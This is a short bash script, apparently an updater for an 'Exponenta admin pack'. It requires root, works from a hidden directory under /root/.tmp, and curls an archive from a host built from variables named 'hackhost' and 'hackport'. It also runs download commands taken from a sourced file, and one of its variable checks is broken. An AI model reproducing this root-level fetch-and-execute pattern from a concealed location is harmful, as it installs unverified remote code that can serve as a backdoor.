#!/bin/bash

# Check if script run at root mode
#

if [ $EUID -ne 0 ]; then
	echo "ERROR: process must be start with root permissions"
	exit 1
fi

# Set Main Variables
#
# Start to download with curl
#
# ATTENTION!!! Changed Values! Check Before Use !!!
#

# Define the variables
if [ ! -z Exponenta1 ]; then
	echo "GENERAL WARNING: The Exponenta1 Variable does not set"
	echo "Trying to set It..."
	if [ -d /root/.tmp/.Exponenta1 ]
	then
		export Exponenta1=/root/.tmp/.Exponenta1
	else
		echo "GENERAL ERROR: The Admin Pack has not been properly Installed"
		exit 2
	fi
fi
if [ ! -f $Exponenta1/Distrib/plugins/mainupdate.variables.sh ]
then
	echo "GENERAL ERROR: File $Exponenta1/Distrib/plugins/mainupdate.variables.sh does not exist"
	exit 2
else
. $Exponenta1/Distrib/plugins/mainupdate.variables.sh
fi

if [ ! -d $Exponenta1/Distrib/plugins ]
then
	echo "GENERAL ERROR: Directory $Exponenta1/Distrib/plugins does not exist"
	exit 2
else
	LocalFolder=$Exponenta1/Distrib/plugins
fi

echo "Setting Host Variable..."
Host=$hackpref"://"$hackhost":"$hackport"/"$hackMainFolder

# Load Main Files

cd $LocalFolder
echo "Loading distrib files..."

curl $Host/exponenta-admin-pack.tar.gz -o exponenta-admin-pack.tar.gz
$distribdownloadx64
$distribdownloadx86
chmod +x DistribDownloadx64.sh
chmod +x DistribDownloadx86.sh

exit 0
